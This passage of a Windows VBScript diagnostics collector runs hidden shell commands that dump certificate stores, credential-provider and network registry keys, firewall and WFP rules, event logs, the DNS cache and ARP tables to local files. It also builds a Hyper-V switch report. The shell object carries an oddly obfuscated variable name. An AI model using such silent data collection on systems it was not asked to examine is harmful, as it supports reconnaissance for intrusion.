    cmd = "cmd /c certutil -v -store -silent My >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    envInfoFile.WriteLine("")
    envInfoFile.WriteLine("User certificates...")
    envInfoFile.WriteLine("")
    envInfoFile.Close

    cmd = "cmd /c certutil -v -store -silent -user My >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    envInfoFile.WriteLine("")
    envInfoFile.WriteLine("Root certificates (machine store)...")
    envInfoFile.WriteLine("")
    envInfoFile.Close

    cmd = "cmd /c certutil -v -store -silent root >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    envInfoFile.WriteLine("")
    envInfoFile.WriteLine("Root certificates (enterprise store)...")
    envInfoFile.WriteLine("")
    envInfoFile.Close
 
    cmd = "cmd /c certutil -v -enterprise -store -silent NTAuth >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
    envInfoFile.WriteLine("")
    envInfoFile.WriteLine("Root certificates (user store)...")
    envInfoFile.WriteLine("")
    envInfoFile.Close

    cmd = "cmd /c certutil -v -user -store -silent root >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

'Comments: Function to dump a tree under a registry path into a file
Sub DumpRegKey(outputFileName,regpath)
    On Error Resume Next
    Dim cmd

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c reg export " & regpath & "  " & outputFileName & " /y"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub

Sub DumpAllKeys
    On Error Resume Next
    Dim NotifRegFile, RegFolder, Key

    RegFolder = "Reg"

    if Not FSO.FolderExists(RegFolder) Then
       FSO.CreateFolder RegFolder
    End If

    ' Dump WLAN registry keys
    AllCredRegFile = RegFolder + "\AllCred.reg.txt"
    AllCredFilterFile = RegFolder + "\AllCredFilter.reg.txt"
    CredRegFileA = RegFolder + "\{07AA0886-CC8D-4e19-A410-1C75AF686E62}.reg.txt"
    CredRegFileB = RegFolder + "\{33c86cd6-705f-4ba1-9adb-67070b837775}.reg.txt"
    CredRegFileC = RegFolder + "\{edd749de-2ef1-4a80-98d1-81f20e6df58e}.reg.txt"
    APIPermRegFile = RegFolder + "\APIPerm.reg.txt"
    NotifRegFile = RegFolder + "\Notif.reg.txt"
    GPTRegFile = RegFolder + "\GPT.reg.txt"
    CUWlanSvcRegFile = RegFolder + "\HKCUWlanSvc.reg.txt"
    LMWlanSvcRegFile = RegFolder + "\HKLMWlanSvc.reg.txt"
    NidRegFile = RegFolder + "\NetworkProfiles.reg.txt"

    call DumpRegKey(NotifRegFile ,"""HKLM\SYSTEM\CurrentControlSet\Control\Winlogon\Notifications""")
    call DumpRegKey(AllCredRegFile ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers""")
    call DumpRegKey(AllCredFilterFile,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Provider Filters""")
    call DumpRegKey(CredRegFileA ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{07AA0886-CC8D-4e19-A410-1C75AF686E62}""")
    call DumpRegKey(CredRegFileB ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{33c86cd6-705f-4ba1-9adb-67070b837775}""")
    call DumpRegKey(CredRegFileC ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Provider Filters\{edd749de-2ef1-4a80-98d1-81f20e6df58e}""")
    call DumpRegKey(APIPermRegFile ,"""HKLM\SYSTEM\CurrentControlSet\Services\Wlansvc\Parameters\WlanAPIPermissions""")

    call DumpRegKey(GPTRegFile , """HKLM\SOFTWARE\Policies\Microsoft\Windows\Wireless\GPTWirelessPolicy""")
    call DumpRegKey(CUWlanSvcRegFile ,"""HKCU\SOFTWARE\Microsoft\Wlansvc""")
    call DumpRegKey(LMWlanSvcRegFile ,"""HKLM\SOFTWARE\Microsoft\Wlansvc""")

    ' Dump Dot3 registry keys
    LMDot3SvcRegFile = RegFolder + "\HKLMDot3Svc.reg.txt"
    CUDot3SvcRegFile = RegFolder + "\HKCUDot3Svc.reg.txt"
    LGPPolicyFile  = RegFolder + "\L2GP.reg.txt"

    call DumpRegKey(LMDot3SvcRegFile ,"""HKLM\SOFTWARE\Microsoft\dot3svc""")
    call DumpRegKey(CUDot3SvcRegFile ,"""HKCU\SOFTWARE\Microsoft\dot3svc""")
    call DumpRegKey(LGPPolicyFile  ,"""HKLM\SOFTWARE\Policies\Microsoft\Windows\WiredL2\GP_Policy""")

    call DumpRegKey(NidRegFile  ,"""HKLM\SOFTWARE\MICROSOFT\Windows NT\CurrentVersion\NetworkList""")
    
    ' Dump WCM registry keys
    WCMPolicyRegFile = RegFolder + "\WCMPolicy.reg.txt"
    call DumpRegKey(WCMPolicyRegFile ,"""HKLM\SOFTWARE\Policies\Microsoft\WcmSvc""")


End Sub

' Dump Winsock LSP catalog
Sub DumpWinsockCatalog(outputFileName)
    On Error Resume Next
    Dim envInfoFile

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netsh winsock show catalog > " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

' Dump the Windows Firewall Configuration
Sub GetWindowsFirewallInfo(configFileName, logFileName, effectiveRulesFileName, consecLogFileName, logFileNameVerbose, consecLogFileNameVerbose)
    On Error Resume Next
    Dim envInfoFile

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c echo Current Profiles: > " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    'Dump the current profiles  
    cmd = "cmd /c netsh advfirewall monitor show currentprofile >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c echo Firewall Configuration: >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    ' Dump the firewall configuration
    cmd = "cmd /c netsh advfirewall monitor show firewall >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c echo Connection Security  Configuration: >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True       

    'Dump the connection security configuration
    cmd = "cmd /c netsh advfirewall monitor show consec >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c echo Firewall Rules : >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True       

    'Dump the firewall rules
    cmd = "cmd /c netsh advfirewall firewall show rule name=all verbose >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c echo Connection Security  Rules : >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True       
    
    'Dump the connection security rules
    cmd = "cmd /c netsh advfirewall consec show rule name=all verbose >> " & configFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   
    
    'Dump the firewall rules from Dynamic Store
    
    cmd = "cmd /c echo Firewall Rules currently enforced : > " & effectiveRulesFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & effectiveRulesFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True           
    
    cmd = "cmd /c netsh advfirewall monitor show firewall rule name=all >> " & effectiveRulesFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    
    'Dump the connection security rules from Dynamic Store
    
    cmd = "cmd /c echo Connection Security Rules currently enforced : >> " & effectiveRulesFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & effectiveRulesFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True       
    
    cmd = "cmd /c netsh advfirewall monitor show consec rule name=all >> " & effectiveRulesFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    

    'Export the operational log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"" " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it could be read on different machines
    cmd = "cmd /c wevtutil al " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   
    
      'Export the operational log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity"" " & consecLogFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it could be read on different machines
    cmd = "cmd /c wevtutil al " & consecLogFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

   
    'Export the operational log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/FirewallVerbose"" " & logFileNameVerbose
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it could be read on different machines
    cmd = "cmd /c wevtutil al " & logFileNameVerbose
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   
    
      'Export the operational log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurityVerbose"" " & consecLogFileNameVerbose
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it could be read on different machines
    cmd = "cmd /c wevtutil al " & consecLogFileNameVerbose
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   
    
End Sub

Sub GetWfpInfo(outputFileName, logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netsh wfp show filters file=" & outputFileName & " > " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub

' Dump Netio State
Sub GetNetioInfo(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netsh interface teredo show state > " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh interface httpstunnel show interface >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh interface httpstunnel show statistics >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub

Sub GetDnsInfo(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    RunCmd "echo IPCONFIG /DISPLAYDNS: ", logFileName   
    RunCmd "ipconfig /displaydns", logFileName

    RunCmd "echo. ", logFileName
    RunCmd "echo NETSH NAMESPACE SHOW EFFECTIVE:", logFileName
    RunCmd "netsh namespace show effective", logFileName
    
    RunCmd "echo.", logFileName
    RunCmd "echo NETSH NAMESPACE SHOW POLICY:", logFileName
    RunCmd "netsh namespace show policy", logFileName

End Sub

Sub GetNeighborInfo(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    RunCmd "echo ARP -A:", logFileName
    RunCmd "arp -a", logFileName

    RunCmd "echo.", logFileName
    RunCmd "echo NETSH INT IPV6 SHOW NEIGHBORS:", logFileName
    RunCmd "netsh int ipv6 show neigh", logFileName

End Sub

Sub GetFileSharingInfo(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    RunCmd "echo NBTSTAT -N:", logFileName
    RunCmd "nbtstat -n", logFileName

    RunCmd "echo.", logFileName
    RunCmd "echo NBTSTAT -C:", logFileName
    RunCmd "nbtstat -c", logFileName

    RunCmd "echo.", logFileName
    RunCmd "echo NET CONFIG RDR:", logFileName
    RunCmd "net config rdr", logFileName

'   Run the following 2 commands only if lanmanserver service is running
'   In WOA build, FileSharing is disabled - hence this results in a prompt
'   which halts the script at that point and netsh trace stop can go on indefinitely

    strComputer = "."
    Set objWmiService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    strQuery = "Select * from WIN32_Service where Name = 'lanmanserver' AND Started = True"
    Set objService = objWmiService.ExecQuery (strQuery)
    
    RunCmd "echo.", logFileName
    RunCmd "echo NET CONFIG SRV:", logFileName

    If objService.Count = 1 Then
        RunCmd "net config srv", logFileName
    Else 
        RunCmd "echo The Server service is not running.", logFileName
    End If

    RunCmd "echo.", logFileName
    RunCmd "echo NET SHARE:", logFileName

    If objService.Count = 1 Then
        RunCmd "net share", logFileName
    Else
        RunCmd "echo The Server service is not running.", logFileName
    End If

End Sub

Sub GetGPResultInfo(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c gpresult /scope:computer /v 1> " & logFileName & " 2>&1"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, False

End Sub

Sub GetNetEventsInfo(outputFileName, logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netsh wfp show netevents file=" & outputFileName & " 1> " & logFileName & " 2>&1"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub

Sub GetShowStateInfo(outputFileName, logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netsh wfp show state file=" & outputFileName & " 1> " & logFileName & " 2>&1"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub

Sub GetSysPortsInfo(outputFileName, logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netsh wfp show sysports file=" & outputFileName & " 1> " & logFileName & " 2>&1"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub

' Add XML node entry
Sub AddXmlNodeEntry(xmlDoc, entryName, entryValue, parentEntry, entryObject)
    On Error Resume Next
    Set entryObject = xmlDoc.createElement(entryName)
    If (IsNull(entryValue) = False) Then 
        entryObject.Text = entryValue
    End If
    parentEntry.appendChild entryObject
End Sub

' Dump Vmswitch State
Sub GetVmswitchInfo(outputFileName)
    On Error Resume Next

    strComputer = "."
    Set objCimService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    onOffState = Array("On", "Off")
    reservationMode = Array("Default", "Weight", "Absolute", "None")
    nicTypeArray = Array("Synthetic", "Emulated", "Internal", "External")
    extensionTypeArray = Array("Unknown", "Capture", "Filter", "Forwarding", "Monitoring", "Native")
    enabledStatesArray = Array("Unknown", "Unknown", "Enabled", "Disabled")
    vlanModeArray = Array("Unknown","Access","Trunk","Private")
    PvlanModeArray = Array("Unknown","Isolated","Community","Promiscuous")
    monitorModeArray = Array("None","Destination","Source")
    aclActionArray = Array("Unknown","Allow","Deny","Meter")
    aclDirectionArray = Array("Unknown","Inbound","Outbound")
    aclApplicabilityArray = Array("Unknown","Local","Remote")
    aclTypeArray = Array("Unknown","MAC","IPv4","IPv6")
    isolationModeArray = Array("None","NativeVirtualSubnet","ExternalVirtualSubnet","VLAN")
    iovInterruptModerationArray = Array("Default", "Adaptive", "Off", "Low", "Medium", "High")

    strQuery = "Select * from WIN32_Service where Name = 'vmms' AND Started = True"
    Set objVmmsService = objCimService.ExecQuery (strQuery)
    If objVmmsService.Count > 0 Then
        Set xmlDoc = CreateObject("Microsoft.XMLDOM")
        Set objRoot = xmlDoc.createElement("VmswitchInfo")
        xmlDoc.appendChild objRoot
        Set objVirtualizationService = GetObject("winmgmts:\\" & strComputer & "\root\virtualization\v2")
        strQuery = "Select * from MSVM_VirtualEthernetSwitch"
        Set switches = objVirtualizationService.ExecQuery (strQuery)
        For Each switch in switches
            Call AddXmlNodeEntry(xmlDoc, "Switch", null, objRoot, objSwitch)
            Call AddXmlNodeEntry(xmlDoc, "Name", switch.Name, objSwitch, objSwitchName)
            Call AddXmlNodeEntry(xmlDoc, "FriendlyName", switch.ElementName, objSwitch, objSwitchFriendlyName)
            strQuery = "Select * from MSVM_VirtualEthernetSwitchSettingData WHERE VirtualSystemIdentifier='" + switch.Name + "'"
            Set switchSetting = objVirtualizationService.ExecQuery (strQuery).ItemIndex(0)
            switchReservationMode = reservationMode(switchSetting.BandwidthReservationMode)
            iovPreferred = switchSetting.IOVPreferred
            
            ' Bandwidth info
            Call AddXmlNodeEntry(xmlDoc, "SwitchBandwidth", null, objSwitch, objBandwidth)
            Call AddXmlNodeEntry(xmlDoc, "BandwidthReservationMode", switchReservationMode, objBandwidth, objSwitchBandwidthReservationMode)
            strQuery = "Select * from MSVM_EthernetSwitchBandwidthData WHERE SystemName ='" + switch.Name + "'"
            Set queryResult = objVirtualizationService.ExecQuery (strQuery)
            If (queryResult.Count > 0) Then
            Set bandwidth = queryResult.ItemIndex(0)
                Call AddXmlNodeEntry(xmlDoc, "BandwidthCapacity", bandwidth.Capacity, objBandwidth, objSwitchBandwidthCapacity)
                Call AddXmlNodeEntry(xmlDoc, "DefaultFlowReservation", bandwidth.DefaultFlowReservation, objBandwidth, objSwitchDefaultFlowReservation)
                Call AddXmlNodeEntry(xmlDoc, "DefaultFlowReservationPercentage", bandwidth.DefaultFlowReservationPercentage, objBandwidth, objSwitchDefaultFlowReservationPercentage)
                Call AddXmlNodeEntry(xmlDoc, "DefaultFlowWeight", bandwidth.DefaultFlowWeight, objBandwidth, objSwitchDefaultFlowWeight)
                Call AddXmlNodeEntry(xmlDoc, "Reservation", bandwidth.Reservation, objBandwidth, objSwitchReservation)
            End if
            
            ' Offload info
            Call AddXmlNodeEntry(xmlDoc, "SwitchOffload", null, objSwitch, objOffload)
            Call AddXmlNodeEntry(xmlDoc, "IOVPreferred", iovPreferred, objOffload, objSwitchIOVPreferred)
            strQuery = "Select * from MSVM_EthernetSwitchHardwareOffloadData WHERE SystemName='" + switch.Name + "'"
            Set queryResult = objVirtualizationService.ExecQuery (strQuery)
            If (queryResult.Count > 0) Then
                Set offload = queryResult.ItemIndex(0)
                Call AddXmlNodeEntry(xmlDoc, "IovQueuePairCapacity", offload.IovQueuePairCapacity, objOffload, objSwitchIovQueuePairCapacity)
                Call AddXmlNodeEntry(xmlDoc, "IovQueuePairUsage", offload.IovQueuePairUsage, objOffload, objSwitchIovQueuePairUsage )
                Call AddXmlNodeEntry(xmlDoc, "IovVfCapacity", offload.IovVfCapacity, objOffload, objSwitchIovVfCapacity)
                Call AddXmlNodeEntry(xmlDoc, "IovVfUsage", offload.IovVfUsage, objOffload, IovVfUsage)
                Call AddXmlNodeEntry(xmlDoc, "IPsecSACapacity", offload.IPsecSACapacity, objOffload, objSwitchIPsecSACapacity)
                Call AddXmlNodeEntry(xmlDoc, "IPsecSAUsage", offload.IPsecSAUsage, objOffload, objSwitchIPsecSAUsage)
            End if

            ' Extension info
            Call AddXmlNodeEntry(xmlDoc, "SwitchExtensions", null, objSwitch, objExtensionList)
            strQuery = "Select * from MSVM_EthernetSwitchExtension WHERE SystemName='" + switch.Name + "'"
            Set extensionList = objVirtualizationService.ExecQuery (strQuery)
            For Each extension In extensionList
                Call AddXmlNodeEntry(xmlDoc, "Extension", null, objExtensionList, objExtension)
                Call AddXmlNodeEntry(xmlDoc, "ElementName", extension.ElementName, objExtension, objExtensionElementName)
                Call AddXmlNodeEntry(xmlDoc, "Name", extension.Name, objExtension, objExtensionName)
                Call AddXmlNodeEntry(xmlDoc, "ExtensionType", extensionTypeArray(extension.ExtensionType), objExtension, objExtensionExtensionType)
                Call AddXmlNodeEntry(xmlDoc, "EnabledState", enabledStatesArray(extension.EnabledState), objExtension, objExtensionEnabledState)
                Call AddXmlNodeEntry(xmlDoc, "EnabledDefault", enabledStatesArray(extension.EnabledDefault), objExtension, objExtensionEnabledDefault)
                Call AddXmlNodeEntry(xmlDoc, "Vendor", extension.Vendor, objExtension, objExtensionVendor)
                Call AddXmlNodeEntry(xmlDoc, "Version", extension.Version, objExtension, objExtensionVersion)
            Next
            
            ' Port info
            strQuery = "Select * from MSVM_EthernetSwitchPort WHERE SystemName='" + switch.Name + "'"
            Set switchPort = objVirtualizationService.ExecQuery (strQuery)
            For Each port In switchPort
                Call AddXmlNodeEntry(xmlDoc, "Port", null, objSwitch, objPort)
                Call AddXmlNodeEntry(xmlDoc, "Name", port.Name, objPort, objPortName)
                Call AddXmlNodeEntry(xmlDoc, "FriendlyName", port.ElementName, objPort, objPortFriendlyName)
                
                'Port offload info
                Call AddXmlNodeEntry(xmlDoc, "PortOffload", null, objPort, objPortOffload)
                strQuery = "Select * from MSVM_EthernetSwitchPortOffloadData WHERE DeviceID='" + port.Name + "'"
                Set queryResult = objVirtualizationService.ExecQuery (strQuery)
                If (queryResult.Count > 0) Then
                    Set portOffload = queryResult.ItemIndex(0)
                    Call AddXmlNodeEntry(xmlDoc, "IovOffloadUsage", portOffload.IovOffloadUsage, objPortOffload, objPortIovOffloadUsage)
                    Call AddXmlNodeEntry(xmlDoc, "IovQueuePairUsage", portOffload.IovQueuePairUsage, objPortOffload, objPortIovQueuePairUsage)
                    Call AddXmlNodeEntry(xmlDoc, "IovVfDataPathActive", portOffload.IovVfDataPathActive, objPortOffload, objPortIovVfDataPathActive)
                    Call AddXmlNodeEntry(xmlDoc, "IovVfId", portOffload.IovVfId, objPortOffload, objPortIovVfId)
                    Call AddXmlNodeEntry(xmlDoc, "IpsecCurrentOffloadSaCount", portOffload.IpsecCurrentOffloadSaCount, objPortOffload, objPortIpsecCurrentOffloadSaCount)
                    Call AddXmlNodeEntry(xmlDoc, "VMQId", portOffload.VMQId, objPortOffload, objPortVMQId)
                    Call AddXmlNodeEntry(xmlDoc, "VMQOffloadUsage", portOffload.VMQOffloadUsage, objPortOffload, objPortVMQOffloadUsage)
                End if
                
                'Port Bandwidth feature status
                Call AddXmlNodeEntry(xmlDoc, "PortBandwidth", null, objPort, objPortBandwidth)
                strQuery = "Select * from MSVM_EthernetSwitchPortBandwidthData WHERE DeviceID='" + port.Name + "'"
                Set queryResult = objVirtualizationService.ExecQuery (strQuery)
                If (queryResult.Count > 0) Then
                    Set portBandwidth = queryResult.ItemIndex(0)
                    Call AddXmlNodeEntry(xmlDoc, "BandwidthReservationPercentage", portBandwidth.CurrentBandwidthReservationPercentage, objPortBandwidth, objPortCurrentBandwidthReservationPercentage)
                End If
                
                'Get the setting data for the port
                Set portSettingObject = port.Associators_("Msvm_ElementSettingData", "Msvm_EthernetPortAllocationSettingData").ItemIndex(0)
                'Port bandwidth setting
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortBandwidthSettingData")
                If (queryResult.Count > 0) Then
                    Set portBandwidthData = queryResult.ItemIndex(0)
                    Call AddXmlNodeEntry(xmlDoc, "BurstLimit", portBandwidthData.BurstLimit, objPortBandwidth, objPortBurstLimit)
                    Call AddXmlNodeEntry(xmlDoc, "BurstSize", portBandwidthData.BurstSize, objPortBandwidth, objPortBurstSize)
                    Call AddXmlNodeEntry(xmlDoc, "Limit", portBandwidthData.Limit, objPortBandwidth, objPortLimit)
                    Call AddXmlNodeEntry(xmlDoc, "Reservation", portBandwidthData.Reservation, objPortBandwidth, objPortReservation)
                    Call AddXmlNodeEntry(xmlDoc, "Weight", portBandwidthData.Weight, objPortBandwidth, objPortBurstWeight)
                End if
                ' Port offload setting
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortOffloadSettingData")
                If (queryResult.Count > 0) Then
                    Set portOffloadData = queryResult.ItemIndex(0)
                    if (portOffloadData.IOVInterruptModeration <= 2) Then
                        iovInterruptModeration = iovInterruptModerationArray(portOffloadData.IOVInterruptModeration)
                    Else
                        iovInterruptModeration = iovInterruptModerationArray(((portOffloadData.IOVInterruptModeration)/100)+2)
                    End if
                    Call AddXmlNodeEntry(xmlDoc, "IOVInterruptModeration", iovInterruptModeration, objPortOffload, objPortIOVInterruptModeration)
                    Call AddXmlNodeEntry(xmlDoc, "IOVOffloadWeight", portOffloadData.IOVOffloadWeight, objPortOffload, objPortIOVOffloadWeight)
                    Call AddXmlNodeEntry(xmlDoc, "IOVQueuePairsRequested", portOffloadData.IOVQueuePairsRequested, objPortOffload, objPortIOVQueuePairsRequested)
                    Call AddXmlNodeEntry(xmlDoc, "IPSecOffloadLimit", portOffloadData.IPSecOffloadLimit, objPortOffload, objPortIPSecOffloadLimit)
                    Call AddXmlNodeEntry(xmlDoc, "VMQOffloadWeight", portOffloadData.VMQOffloadWeight, objPortOffload, objPortVMQOffloadWeight)
                End If
                ' Port security setting
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortSecuritySettingData")
                If (queryResult.Count > 0) Then
                    Set portSecurityData = queryResult.ItemIndex(0)
                    Call AddXmlNodeEntry(xmlDoc, "PortSecurity", null, objPort, objPortSecurity)
                    Call AddXmlNodeEntry(xmlDoc, "AllowIeeePriorityTag", onOffState(portSecurityData.AllowIeeePriorityTag+1), objPortSecurity, objPortAllowIeeePriorityTag)
                    Call AddXmlNodeEntry(xmlDoc, "AllowMacSpoofing", onOffState(portSecurityData.AllowMacSpoofing+1), objPortSecurity, objPortAllowMacSpoofing)
                    Call AddXmlNodeEntry(xmlDoc, "AllowTeaming", onOffState(portSecurityData.AllowTeaming+1), objPortSecurity, objPortAllowTeaming)
